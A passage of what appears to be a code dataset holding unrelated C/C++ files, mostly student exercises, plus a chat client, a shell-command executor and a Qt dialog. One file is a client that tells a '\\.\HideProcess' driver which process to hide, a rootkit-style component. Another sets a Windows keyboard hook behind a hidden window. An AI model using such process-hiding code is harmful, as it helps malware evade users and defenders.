image_matrix->h;\n    fb.data = image_matrix->item;\n    fb.bytes_per_pixel = 3;\n    fb.format = FB_BGR888;\n    for (i = 0; i < boxes->len; i++){\n        // rectangle box\n        x = (int)boxes->box[i].box_p[0];\n        y = (int)boxes->box[i].box_p[1];\n        w = (int)boxes->box[i].box_p[2] - x + 1;\n        h = (int)boxes->box[i].box_p[3] - y + 1;\n        fb_gfx_drawFastHLine(&fb, x, y, w, color);\n        fb_gfx_drawFastHLine(&fb, x, y+h-1, w, color);\n        fb_gfx_drawFastVLine(&fb, x, y, h, color);\n        fb_gfx_drawFastVLine(&fb, x+w-1, y, h, color);\n#if 0\n        // landmark\n        int x0, y0, j;\n        for (j = 0; j < 10; j+=2) {\n            x0 = (int)boxes->landmark[i].landmark_p[j];\n           ",
    "#include \"KeyboardHook.h\"\n#include <string>\n#include <strsafe.h>\n#include \"WindowCreator.h\"\n#include \"Tray.h\"\n#include <Windows.h>\n\n/// <summary>\n/// https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winmain\n/// \n/// _In_ - \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0439 \u0432\u0445\u043e\u0434\u043d\u043e\u0439 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 \n/// _In_opt_ - \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0439 \u0432\u0445\u043e\u0434\u043d\u043e\u0439 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 \u0441 \u0434\u043e\u043f\u0443\u0441\u043a\u0430\u043d\u0438\u0435\u043c null\n/// </summary>\n/// <param name=\"hInstance\"> - \u0414\u0435\u0441\u043a\u0440\u0438\u043f\u0442\u043e\u0440 \u0442\u0435\u043a\u0443\u0449\u0435\u0433\u043e \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f. </param>\n/// <param name=\"hPrevInstance\"> - \u0414\u0435\u0441\u043a\u0440\u0438\u043f\u0442\u043e\u0440 \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0435\u0433\u043e \u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440\u0430 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f. </param>\n/// <param name=\"lpCmdLine\"> - \u0410\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u044b \u043a\u043e\u043c\u0430\u043d\u0434\u043d\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438 \u0431\u0435\u0437 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f. </param>\n/// <param name=\"nShowCmd\"> - \u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\u043c \u043e\u043a\u043d\u0430. </param>\n/// <returns></returns>\nint WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)\n{\n\tconst HWND hwnd = CreateMainHiddenWindow(hInstance);\n\tAddIconInTray(hwnd);\n\tSetWindowsHook(hInstance);\n\n\tMSG message;\n\tBOOL bRet;\n\twhile ((bRet = GetMessage(&message,NULL, 0,0)) != 0)\n\t{\n\t\tif (bRet == -1)\n\t\t{\n\n\t\t}\n\t\telse\n\t\t{\n\t\t\tTranslateMessage(&message);\n\t\t\tDispatchMessage(&message);\n\t\t}\n\t}\n\tDeleteIconFromTray();\n\tUnsetWindowsHook();\n}\n\n\n\n",
    "#include <iostream>\n#include <iomanip>\n#include <time.h>\nusing namespace std;\nvoid Create(int* a, const int size, const int Low, const int High);\nint Max(int* a, const int size);\nvoid Print(int* a, const int size);\nint indexdodat(int* a,int size , int idod);\nint sum(int* a, int i, int size, int sum);\nvoid Sort(int* a, const int size, int poch, int kinz);\nint main()\n{\n\tsrand((unsigned)time(NULL)); // \u00b3\u00ed\u00b3\u00f6\u00b3\u00e0\u00eb\u00b3\u00e7\u00e0\u00f6\u00b3\u00ff \u00e3\u00e5\u00ed\u00e5\u00f0\u00e0\u00f2\u00ee\u00f0\u00e0 \u00e2\u00e8\u00ef\u00e0\u00e4\u00ea\u00ee\u00e2\u00e8\u00f5 \u00f7\u00e8\u00f1\u00e5\u00eb\n\tint n = 0;\n\tint a1;\n\tint b;\n\tint sum1 = 0;\n\tint idod = 0 ;\n\n\tcout << \"Input size - \";\n\tcin >> n;\n\tcout << \"Input a - \";\n\tcin >> a1;\n\tcout << \"Input b - \";\n\tcin >> b;\n\t\n\tint imax;\n\timax = n - 1;\n\tint* a = new int[n];\n\tint Low = -15; \n\tint High = 15;\n\t\n\tCreate(a, n, Low, High); \n\tint c = indexdodat(a, n, idod);\n\tcout << \"       sum\" << setw(2) << \"=\" << setw(2) << sum(a,c, n,sum1) << endl;\n\tcout << \"Ind of max\" << setw(2) << \"=\" << setw(2) << Max(a, n) << endl;\n\tPrint(a, n);\n\tSort(a,n,a1,b);\n\tPrint(a, n);\n\tdelete[] a;\n\treturn 0;\n}\nint sum(int* a, int i, int size , int sum )\n{\n\tfor (int j =i; j < size; j++)\n\t\tsum += a[j];\n\treturn sum ;\n}\n\n\nint indexdodat(int* a, int size, int idod)\n{\n\tint j = 0;\n\tfor (int i = 0; i < size; i++)\n\t{  \n\t\tif (a[i] > 0) {\n\t\t\tidod = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn idod;\n}\nvoid Create(int* a, const int size, const int Low, const int High)\n{\n\tfor (int i = 0; i < size; i++)\n\t\ta[i] = Low + rand() % (High - Low + 1);\n}\nint Max(int* a, const int size)\n{\n\tint max = a[size - 1];\n\tint imax = -1; // \u00b3\u00ed\u00e4\u00e5\u00ea\u00f1 \u00ec\u00e0\u00ea\u00f1\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00ee\u00e3\u00ee \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0\n\tfor (int i = 0; i < size - 1; i++)\n\t\tif (abs(max) < abs(a[i]))\n\t\t{\n\t\t\tmax = a[i];\n\t\t\timax = i;\n\t\t}\n\tif (imax == -1)\n\t{\n\t\timax = size - 1;\n\t}\n\treturn imax;\n}\nvoid Sort(int* a, const int size, int poch, int kinz)\n{\n\tint n = 0;\n\tfor (int j = 1; j < size; j++) // \u00ed\u00ee\u00ec\u00e5\u00f0 \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00ee\u00e3\u00ee \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0\n\t\tif (!(a[j] < kinz && a[j] > poch)) // \u00ff\u00ea\u00f9\u00ee \u00ef\u00ee\u00f0\u00f3\u00f8\u00e5\u00ed\u00ee \u00f3\u00ec\u00ee\u00e2\u00f3 \u00e2\u00ef\u00ee\u00f0\u00ff\u00e4\u00ea\u00f3\u00e2\u00e0\u00ed\u00ed\u00ff\n\t\t{\n\t\t\tint tmp = a[j];\n\n\t\t\tfor (int k = size-1; k >= j; k--) \n\t\t\t{ // \u00e7\u00f1\u00f3\u00e2\n\t\t\t\ta[k + 1] = a[k];\n\t\t\t}\n\t\t\ta[n] = a[j];\n\t\t\tn++;\n\t\t}\n}\n\t//for (int c = 0; c <= size - 1; c++) {\n\t//\tfor (int i = 0; i >= poch && i <= kinz; i++) {\n\t//\t\tint temp = a[c];\n\t//\t\tint s = kinz - poch;\n\t//\t\ta[c] = i;\n\t//\t\ta[c + s] = temp;\n\t//\t\ttemp = 0;\n\t//\t}\n\t//}\n\t/*for (int i = 0; i <= size - 1; i++) {\n\t\tfor (int j = i + 1; j < size; j++){\n\t\t\tif (!(a[j] >= poch && a[j] <= kinz) && (a[i] >= poch && a[i] <= kinz)|| (a[j] >= poch && a[j] <= kinz) && !(a[i] >= poch && a[i] <= kinz)) {\n\t\t\t\tint tmp = a[j];\n\t\t\t\ta[j] = a[i];\n\t\t\t\ta[i] = tmp;\n\t\t\t}\n\t\t};\n\t}*/\n\t\n/*int cout = 0;\n\n\t\tif (a[c] >= poch && a[c] <= kinz) {\n\t\t\tif (a[cout] >= poch && a[cout] <= kinz)\n\t\t\t\tcout += 1;\n\t\t\tint temp;\n\t\t\ttemp = a[cout];\n\t\t\ta[cout] = a[c]; \n\t\t\ta[c] = temp; \n\t\t\tcout++;*/\n\nvoid Print(int* a, int size)\n{\n\tcout << \"a[\" << setw(1);\n\tfor (int i = 0; i < size; i++)\n\t\tif (i == size - 1)\n\t\t\tcout << setw(1) << a[i];\n\t\telse\n\t\t\tcout << setw(1) << a[i] << \", \";\n\tcout << \"]\" << endl;\n}\n",
    "#include <iostream>\r\n#include <Windows.h>\r\n#include <TlHelp32.h>\r\n\r\n#define IOCTL_GET_PROCESSNAME CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)\r\n\r\nusing namespace std;\r\n\r\nint main(int argc, char* argv[]) {\r\n    if (argc != 2) {\r\n        cout << \"Usage: \" << argv[0] << \" <process_name>\" << endl;\r\n        return 1;\r\n    }\r\n\r\n    string procName = argv[1];\r\n\r\n    HANDLE hDevice = CreateFile(L\"\\\\\\\\.\\\\HideProcess\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);\r\n    if (hDevice == INVALID_HANDLE_VALUE)\r\n    {\r\n        cout << \"Failed to open device, error: \" << GetLastError() << endl;\r\n        return 1;\r\n    }\r\n\r\n    DWORD bytesReturned;\r\n    // Aseg\u00farate de enviar correctamente el buffer de entrada\r\n    BOOL result = DeviceIoControl(hDevice, IOCTL_GET_PROCESSNAME, (LPVOID)procName.c_str(), (DWORD)(procName.length() + 1), NULL, 0, &bytesReturned, NULL);\r\n\r\n    if (result)\r\n    {\r\n        cout << \"Process name sent successfully: \" << procName << endl;\r\n    }\r\n    else\r\n    {\r\n        cout << \"Failed to send process name. Error: \" << GetLastError() << endl;\r\n    }\r\n\r\n    CloseHandle(hDevice);\r\n    return 0;\r\n}\r\n",
    "\n#include <iostream>\n#include <string>\nusing namespace std;\n\n// Class definition for Student\nclass Student {\nprivate:\n    string name;\n    int rollNumber;\n\npublic:\n    \n    /*\n    Code Guidline\n        1. make a default constructor with Unknow values\n        2. write a cout line that will show that constructor is called\n        3. Make parametrize construcotr.\n        4. write a disply value function.\n    */\n    Student() {\n        name = \"Unknown\";\n        rollNumber = 0;\n        cout << \"Default constructor is called.\" << endl;\n    }\n\n    Student(string n, int roll) {\n        name = n;\n        rollNumber = roll;\n    }\n\n    void displayStudent() const {\n        cout << \"Name: \" << name << \", Roll Number: \" << rollNumber << endl;\n    }\n};\n\nint main() {\n\n    // --- For Student Class Example ---\n\n    Student students[3];  \n\n     // Displaying the array of default-constructed students\n    cout << \"Default-constructed students:\" << endl;\n    for (int i = 0; i < 3; i++) {\n        students[i].displayStudent();  // Output: Name: Unknown, Roll Number: 0\n    }\n\n    // Creating an array of Student objects with the parameterized constructor\n    Student ucpStudents[] = {\n        Student(\"Hamza\", 101),\n        Student(\"Waqar\", 102),\n        Student(\"Ali\", 103)\n    };\n   \n    // Displaying the array of parameterized-constructed students\n    cout << \"Parameterized-constructed students:\" << endl;\n    for (int i = 0; i < 3; i++) {\n        ucpStudents[i].displayStudent();\n    }\n\n    return 0;\n}",
    "#include <iostream>\nusing namespace std;\nclass class_stack\n{\n    int queue[3],t,front=0,rear=-1,maxsize=3;\n    char q;\n    public:\n    void insert()\n    {\n       do{ if(rear==maxsize-1)\n        {\n            cout<<\"--queue overflow--\"<<endl;;\n            return;\n        }\n        else\n        {\n            rear++;\n            cout<<\"enter item to push :\";\n            cin>>queue[rear];\n            if(rear==maxsize-1)\n        {\n            cout<<\"--queue is full--\"<<endl;;\n            return;\n        }\n            cout<<\"push again? y/n :\";\n            cin>>q;}}\n            while(q=='y');\n           return;\n        \n    }\n    void remove()\n    {\n       do{ if(front>rear)\n        {\n            cout<<\"--queue underflow--\"<<endl;\n            return;\n        }\n        else\n        {\n            cout<<\"item delated :\"<<queue[front]<<endl;\n            front++;\n            if(front>rear)\n            {\n                front=0;\n                rear=-1;\n            }\n            if(front>rear)\n        {\n            cout<<\"--eueue empty--\"<<endl;\n            return;\n        }\n            cout<<\"delete again? y/n :\";\n            cin>>q;}}\n           while(q=='y');\n            \n           return;\n            \n        \n    }\n    \n    \n    void display(){int i;\n        if(front>rear)\n        {\n            cout<<\"--queue is empty\"<<endl;\n            return;\n        }\n        else\n        {\n            cout<<\"elements :\";\n            for(i=front;i<=rear;i++)\n            cout<<queue[i]<<\"\\t\";\n            cout<<endl;\n        }\n    }\n};\n    int main()\n    \n    {int t;\n        class_stack a;\n      do{  cout<<\"1.insert\\n2.delete\\n3.display\\n4.exit\\nenter the condition :\";\n        cin>>t;\n        if(t==1)\n        a.insert();\n        else if(t==2)\n        a.remove();\n        else if(t==4)\n        cout<<\"finished\";\n        else if(t==3)\n        a.display();\n        else\n        cout<<\"invalid input\";\n            \n        }\n        while(t!=4);\n        return 0;\n}\n",
    "/******************************************************************************/\n/**\n * @file execute_file.cpp\n * @brief File containing function for executing files.\n *\n * This file set implements POSIX posix_spawn to execute files. It contains a\n * function for executing files which includes shell commands.\n *\n * @author willisjh\n * @date 11 April 2022\n *\n * @addtogroup ExecuteFile\n * @{\n *\n ******************************************************************************/\n\n\n /******************************** Include Files *******************************/\n#include \"common/execute_file/execute_file.hpp\"\n\n#include <cerrno>\n#include <cstdio>\n#include <cstdint>\n#include <cstring>\n#include <memory>\n#include <stdexcept>\n#include <thread>\n\n#include <sys/stat.h>\n#include <spawn.h>\n#include <unistd.h>\n#include <wait.h>\n\n#include \"common/log_msg/log_msg.hpp\"\n\n/**************************** Constant Definitions ****************************/\nconst size_t kCBBufferStdout = 256;\n\n/****************************** Type Definitions ******************************/\n\n/************************* Inline Function Definitions ************************/\n\n/****************************** Global Variables ******************************/\n\n/**************************** Function Definitions ****************************/\n\n/******************************************************************************/\n/**\n * Function for executing files and reading execution output.\n *\n * @param[in] exec_cmd           The string of the file execution line.\n * @param[in] time_poll_interval The time between polls on the execution status.\n *\n * @return result_stdout The string of the output results.\n *\n * @note None.\n *\n ******************************************************************************/\nstd::string ExecFile(const std::string exec_cmd, const std::chrono::duration<float> time_poll_interval)\n{\n    int rc_status = -1;\n\n\n    /**- Redirect STDOUT by creating a file actions object and adding a \"close\" action to it. */\n    int rg_fildes_pipe_stdout[2] = {};\n    pipe(rg_fildes_pipe_stdout);\n    posix_spawn_file_actions_t struct_file_actions;\n\n    rc_status = posix_spawn_file_actions_init(&struct_file_actions);\n    if (rc_status != 0)\n    {\n        throw std::runtime_error(\"posix_spawn_file_actions_init() failed! RC: \" + std::to_string(rc_status) + \" Error: \" + static_cast<std::string>(strerror(errno)));\n    }\n\n    rc_status = posix_spawn_file_actions_addclose(&struct_file_actions, rg_fildes_pipe_stdout[0]);\n    if (rc_status != 0)\n    {\n        throw std::runtime_error(\"posix_spawn_file_actions_addclose() failed! RC: \" + std::to_string(rc_status) + \" Error: \" + static_cast<std::string>(strerror(errno)));\n    }\n\n    rc_status = posix_spawn_file_actions_adddup2(&struct_file_actions, rg_fildes_pipe_stdout[1], STDOUT_FILENO);\n    if (rc_status != 0)\n    {\n        throw std::runtime_error(\"posix_spawn_file_actions_adddup2() failed! RC: \" + std::to_string(rc_status) + \" Error: \" + static_cast<std::string>(strerror(errno)));\n    }\n\n    /**- Spawn the child process with provided execution string. */\n    /* The environment of the program executed in the child is made the same as the parent's environment. */\n    char* sz_exec_cmd = new char[exec_cmd.size() + 1];\n    std::copy(exec_cmd.begin(), exec_cmd.end(), sz_exec_cmd);\n    sz_exec_cmd[exec_cmd.size()] = '\\0';\n    char* prgch_argv[] = { \"/bin/sh\", \"-c\", sz_exec_cmd, NULL };\n\n    pid_t id_child_pid;\n    char** environ;\n    rc_status = posix_spawnp(&id_child_pid, prgch_argv[0], &struct_file_actions, NULL, prgch_argv, environ);\n    if (rc_status != 0)\n    {\n        throw std::runtime_error(\"posix_spawn() failed! RC: \" + std::to_string(rc_status) + \" Error: \" + static_cast<std::string>(strerror(errno)));\n    }\n\n    /**- Destroy any objects that we created earlier. */\n    delete[] sz_exec_cmd;\n\n    if (&struct_file_actions != nullptr)\n    {\n        rc_status = posix_spawn_file_actions_destroy(&struct_file_actions);\n        if (rc_status != 0)\n        {\n            throw std::runtime_error(\"posix_spawn_file_actions_destroy() failed! RC: \" + std::to_string(rc_status) + \" Error: \" + static_cast<std::string>(strerror(errno)));\n        }\n    }\n\n    /**- Monitor status of the child process until it terminates. */\n    int id_child_status = -1;\n    do\n    {\n        rc_status = waitpid(id_child_pid, &id_child_status, WUNTRACED | WCONTINUED);\n        if (rc_status == -1)\n        {\n            throw std::runtime_error(\"waitpid() failed!\");\n        }\n\n        if (WIFSIGNALED(id_child_status))\n        {\n            throw std::runtime_error(\"ExecFile child process killed by signal: \" + std::to_string(WTERMSIG(id_child_status)));\n        }\n        else if (WIFSTOPPED(id_child_status))\n        {\n            LOG_MSG_DEBUG(\"ExecFile child process stopped by signal: \", std::to_string(WSTOPSIG(id_child_status)));\n        }\n        else if (WIFCONTINUED(id_child_status))\n        {\n            LOG_MSG_DEBUG(\"ExecFile child process continued.\"",
    "#include <iostream>\n#include <string>\n#include <windows.h>\n\nusing namespace std;\n\nclass Notepad\n{\npublic:\n    string contents = \"----------- ConsolePad -----------\\n\";\n\n    string WriteToLine (string *cLine, string *rContent)\n    {\n        string output =  *cLine + \". \" + *rContent + \"\\n\";\n        contents = contents + output;\n        return contents;\n    }\n\n    void Clear()\n    {\n        system(\"cls\");\n        contents = \"----------- ConsolePad -----------\\n\";\n        cout << contents;\n    }\n\n    void StartUp()\n    {\n        system(\"cls\");\n        cout << contents;\n    }\n};\n\nint main ()\n{\n    string x;\n    int cline = 0;\n    Notepad notepad;\n    notepad.StartUp();\n\n    while (true)\n    {\n        if (x == \"/clear\")\n        {\n            cline = 0;\n            notepad.Clear();\n        }\n\n        cline++;\n        string clineSTR = to_string(cline);\n        cout << clineSTR + \". \";\n        getline(cin, x);\n        system(\"cls\");\n        string contents = notepad.WriteToLine(&clineSTR, &x);\n        cout << contents;\n    }\n    return 0;\n}\n",
    "#include<bits/stdc++.h>\n#include <cstring>\n#include <iostream>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>  // For inet_addr\n#include <unistd.h>\n#include<thread>\nusing namespace std;\n\nstring CeaserEncrypt(const string& message,int shift) {\n    string result = message;\n    for(int i = 0; i<message.size(); i++) {\n        if(isalpha(result[i])) {\n            char base = islower(result[i]) ? 'a':'A';\n            result[i] = (result[i]-base+shift)%26+base;\n        }\n\n    }\n\n    return result;\n}   \n\nstring CeaserDecrypt(const string& message,int shift) {\n    string result = message;\n    for(int i = 0; i<message.size(); i++) {\n        if(isalpha(result[i])) {\n            char base = islower(result[i]) ? 'a':'A';\n            result[i] = (result[i]-base-shift+26)%26+base;\n        }\n\n    }\n\n    return result;\n}  \n\nstring shift_to_binary(int shift) {\n   // Ensure the shift value is within valid range (0-15)\n    shift = shift & 0xF;  // Mask to 4 bits\n    return bitset<4>(shift).to_string();\n}\n\nint binary_to_shift(const string& binary) {\n    // Validate binary string length and content\n    if (binary.length() != 4) {\n        throw runtime_error(\"Invalid binary string length\");\n    }\n    for (char c : binary) {\n        if (c != '0' && c != '1') {\n            throw runtime_error(\"Invalid binary character\");\n        }\n    }\n    return bitset<4>(binary).to_ulong();\n}\n\nbool inChatMode = false;\nstring username;\nmutex cout_mutex;\nbool waitingForUsername = false;\n\n\nvoid sendmessage(int clienSocket) {\n     string message;\n    \n    // Wait for initial system messages\n    this_thread::sleep_for(chrono::milliseconds(500));                                                                                                                                           \n    while(1) {\n        \n        if(username.empty() && inChatMode) {\n            {\n                lock_guard<mutex> lock(cout_mutex);\n                waitingForUsername = true;\n                cout << \"\\033[1;32mEnter your username: \\033[0m\";\n            }\n            \n            getline(cin, username);\n            \n            {\n                lock_guard<mutex> lock(cout_mutex);\n                waitingForUsername = false;\n                while(username.empty()) {\n                    cout << \"\\033[1;31mUsername cannot be empty. Please enter your username: \\033[0m\";\n                    getline(cin, username);\n                }\n                cout << \"\\033[1;32mWelcome, \" << username << \"! You can now start sending messages.\\033[0m\" << endl;\n            }\n            continue;\n        }\n\n\n        getline(cin, message);\n\n        if(message == \"quit\") {\n            cout << \"Stopping the application...\" << endl;\n            close(clienSocket);\n            break;\n        }\n\n\n        string msgtosend;\n        if(!inChatMode) {\n            msgtosend = message;\n        } else {\n            string msg = username + \": \" + message;\n            srand(time(0));\n            int shift = rand() % 12 + 1;\n            string encryptmsg = CeaserEncrypt(msg, shift);\n            string binaryshift = shift_to_binary(shift);\n            msgtosend = \"MSG:\" + binaryshift + encryptmsg;\n        }\n\n         \n        int bytesend = send(clienSocket, msgtosend.c_str(), msgtosend.size(), 0);\n        if(bytesend == -1) {\n            cerr << \"Error while sending the message\" << endl;\n            break;\n        }\n    }\n\n    close(clienSocket);\n\n}\n\nvoid recievemessage(int clientSocket) {\n\n    char buffer[1024] = {0};\n    ssize_t recvlen;\n\n    while(1) {\n        recvlen = recv(clientSocket,buffer,sizeof(buffer),0);\n        if(recvlen <= 0) {\n            cerr << \"dissconnect from the server\" << endl;\n            break;\n        }\n        string msg(buffer, recvlen);\n        memset(buffer, 0, sizeof(buffer));\n\n         if(msg.substr(0, 4) == \"SYS:\") {\n            cout << \"\\033[1;33m\" << msg.substr(4) << \"\\033[0m\" << endl;\n            \n            if(msg.find(\"Successfully joined\") != string::npos || \n               msg.find(\"Created new public room\") != string::npos ||\n               msg.find(\"Joined existing room\") != string::npos) {\n                inChatMode = true;\n                cout << \"\\033[1;32m\" << \"Entered chat mode - messages will now be encrypted\" << \"\\033[0m\" << endl;\n                \n              \n            }\n        } else if(msg.substr(0, 4) == \"MSG:\" && msg.length() >= 8) {\n            try {\n                string binaryshift = msg.substr(4, 4);  // Changed from 8 to 4\n                int key = binary_to_shift(binaryshift);\n                string encryptedmsg = msg.substr(8);\n                string decryptedmsg = CeaserDecrypt(encryptedmsg, key);\n                cout << \"\\033[1;37m\" << decryptedmsg << \"\\033[0m\" << endl;\n            } catch(const exception& e) {\n                cerr << \"Error decrypting message: \" << e.what() << endl;\n                // Print debug information\n                cout << \"Debug - Full message: \" << msg << endl;\n                cout << ",
    "\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\n\r\n//     int printsum(int a , int b) {\r\n//         return a+b;\r\n//     }\r\n\r\n//   int main() {\r\n  \r\n\r\n//     int sum = printsum(1,2);\r\n//     cout<<sum;\r\n\r\n//   }\r\n\r\n/////////////////pairs in c++////\r\n\r\n//void explainpair() {\r\n//     pair<int,int> p = {1 ,3};\r\n//     cout<<p.first << \" \" << p.second;\r\n// }\r\n\r\n//     void explainpair1() {\r\n//     pair<int , pair<int,int>> p={1 ,{2,3}};\r\n//     cout<<p.second.second<<\" \"<< p.second.first;\r\n\r\n// }\r\n\r\n//  int main () {\r\n//    explainpair();\r\n//    cout<<endl;\r\n//    explainpair1();\r\n//  }\r\n\r\n ///////vectors on c++/////\r\n\r\n//  void explainvector() {\r\n\r\n// // creation of a vector\r\n//   vector<int> v;\r\n\r\n\r\n// insertion of a vector\r\n  // v.push_back(1);\r\n  // v.emplace_back(2);\r\n  \r\n  // vector <int> v(5);\r\n\r\n  // vector<int>v1(5,10);\r\n  // vector<int> v2(v1);\r\n\r\n  // //using an iterator in vector\r\n\r\n  //   vector<int>::iterator it = v.begin();\r\n  //   it++;\r\n  //   cout<<*(it) << \" \"; \r\n\r\n  //   vector<int> :: iterator it = v.end();\r\n    \r\n  //   for(vector<int>:: iterator it = v.begin(); it != v.end() ; it++) {\r\n  //     cout<< *(it) << \" \";\r\n  //   }\r\n\r\n  //   for(auto it = v.begin(); it != v.end() ; it++) {\r\n  //     cout<< *(it) << \" \";\r\n  //   }\r\n\r\n  //   //deletion in a vector \r\n\r\n  //   //{10 , 20 , 30 ,40 , 50}\r\n  //   v.erase(v.begin()+2 , v.begin()+4);  \r\n  //   // {10, 40 ,50}\r\n\r\n// insert an functionn \r\n\r\n//   vector<int> v (2 ,100); //{100 , 100}\r\n//   v.insert(v.begin() , 300)  // {300 , 100 ,100}\r\n//   v.insert(v.begin()+1 , 2 , 100); // {300 , 10 ,10 100 ,100}\r\n\r\n  \r\n//  }\r\n\r\n /////////list in c++ ///////\r\n\r\n//  void explainlist() {\r\n//   list<int> ls;\r\n\r\n//   ls.push_back(5); //{5}\r\n\r\n//   ls.push_front(4); //{4,5}\r\n\r\n//  }\r\n\r\n ////stack////////\r\n\r\n//  void explainstack() {\r\n//   stack<int> st;\r\n//   st.push(1);\r\n//   st.push(2);\r\n//   st.push(3);\r\n//   st.push(4);  //{4,3,2,1}\r\n\r\n//   cout<<st.top(); //prints 4\r\n//   cout<<st.pop(); // deletes 4 \r\n//   cout<st.size(); // prints 4 \r\n\r\n  //////////queue in c++////\r\n\r\n  // void explainqueue() {\r\n  //   queue <int> q;\r\n  //   q.push(1);\r\n  //   q.push(2);\r\n  //   q.push(3);\r\n  //   q.push(4);   //{1,2,3,4}\r\n\r\n  //   cout<<q.back(); // prints 4\r\n  //   cout<<q.front(); //prints 1\r\n  //   cout<<q.pop(); //deletes 1\r\n  // }\r\n//////////// priority ////////\r\n\r\n// void explainPQ() {\r\n//   priority_queue <int> pq;\r\n//   pq.push(5);\r\n//   pq.push(2);\r\n//   pq.push(7);\r\n//   pq.push(8);  // {8,7,5,2} order wise\r\n\r\n//   cout<< pq.top(); // prints 8\r\n//   pq.pop();   //deletes 8\r\n\r\n// }\r\n \r\n\r\n ///////set in c++//////////\r\n\r\n//  void explainset() {\r\n//   set<int> st;\r\n//   st.insert(1);\r\n//   st.insert(2);\r\n//   st.emplace(2);\r\n//   st.emplace(3);  // not insert 2 cause it is already inserted\r\n//   st.emplace(4);  //{1,2,3,4}\r\n\r\n//   auto it = st.find(3); // FINDS 3 AND PRINTS\r\n\r\n//   auto it = st.find(6); // ]returns end() cause 6 is no there\r\n\r\n// st.erase(4); //{1,2,3}\r\n\r\n\r\n//  }\r\n\r\n //////////multiset/////////////\r\n  \r\n//   void explainmultiset() {\r\n//   multiset<int>ms;\r\n//   ms.insert(1);\r\n//   ms.insert(1);\r\n//   ms.insert(1);\r\n//   ms.insert(1);  //{1,1,1,1}\r\n\r\n// ms.erase(1); //all 1's are erased\r\n\r\n// ms.erase(ms.find(1));  //only a single 1 is erased\r\n\r\n// ms.erase(ms.find(1), ms.find(1) +2); // from first to 3 element is erased only\r\n\r\n//   }\r\n\r\n  //////////MAP./////////////////\r\n\r\n  void explainmap() {\r\n    map <int,int> mpp;\r\n\r\n\r\n    mpp[1] = 2; //stores value 2 at the key 1\r\n    mpp.emplace ({3,1});\r\n    mpp.insert({2,4});  //  {2,4,1}\r\n\r\n    for(auto it : mpp) {\r\n      cout<< it.first << \" \" << it.second << endl;\r\n    }\r\n  }\r\n\r\n  /////////sorting of an vector////////////\r\n\r\n    vector <int> a;\r\n\r\n    //{1,2,5,3}\r\n    sort(a+2 , a+4); //sort an {1,2,3,5}\r\n\r\n    sort(a , a+n , greater<int>); //sorts in ascending order\r\n    \r\n    ///////comporator////\r\n     \r\n     bool comp(pair<int,int>p1, pair <int, int> p2) {\r\n      if(p1.second < p2.second) return true;\r\n      if(p1.second > p2.second) return false;\r\n\r\n      if(p1.first > p2.first) return true;\r\n      return false;\r\n     }\r\n\r\n\r\n  ///////////////\r\n",
    "#include \"cutavator.h\"\r\n#include \"ui_cutavator.h\"\r\n#include \"registerwindow.h\"\r\n\r\nCutAvator::CutAvator(const QString &mypath,QWidget *parent)\r\n    : QDialog(parent),ui(new Ui::CutAvator)\r\n    , path(mypath)\r\n{\r\n    ui->setupUi(this);\r\n    //\u5904\u7406\u4f20\u5165\u7684\u56fe\u7247\uff0c\u786e\u4fdd\u5b83\u662f\u6709\u6548\u7684\r\n    dealImage(mypath);\r\n    //\u5148\u622a\u4e00\u6b21 \u9632\u6b62\u56fe\u7247\u683c\u5f0f\u51fa\u9519\r\n    on_but_cut_clicked();\r\n    //\u8fde\u63a5\u622a\u53d6\u6846\u4fe1\u53f7\u69fd\r\n    connect(ui->lab_cut, &DraggableResizableLabel::labelMoved, this, &CutAvator::moveRect);\r\n    ui->lab_cut->resize(277,277);\r\n    // \u5c06\u7a97\u53e3\u5c45\u4e2d\u663e\u793a\r\n    QWidget *topLevelParent = parent ? parent->window() : nullptr;\r\n    if (topLevelParent) {\r\n        int x = topLevelParent->x() + (topLevelParent->width() - width()) / 2;\r\n        int y = topLevelParent->y() + (topLevelParent->height() - height()) / 2;\r\n        move(x, y);\r\n    }\r\n}\r\n\r\n\r\nCutAvator::~CutAvator()\r\n{\r\n    delete ui;\r\n    delete labelRect;\r\n}\r\n\r\n\r\nvoid CutAvator::dealImage(QString path)//\u5904\u7406\u4f20\u5165\u7684\u56fe\u7247\r\n{\r\n    QImage image(path);\r\n    if (image.isNull()) {\r\n        QMessageBox msgBox;\r\n        QIcon icon = QApplication::style()->standardIcon(QStyle::SP_MessageBoxWarning);\r\n        msgBox.setIcon(QMessageBox::Critical);\r\n        msgBox.setWindowIcon(icon);\r\n        msgBox.setWindowTitle(\"\u52a0\u8f7d\u5931\u8d25\");\r\n        msgBox.setText(\"\u60a8\u7684\u56fe\u7247\u6709\u95ee\u9898!\");\r\n        msgBox.setWindowFlags(Qt::WindowStaysOnTopHint | Qt::Dialog);\r\n        msgBox.exec();\r\n        return;\r\n    }\r\n    image = 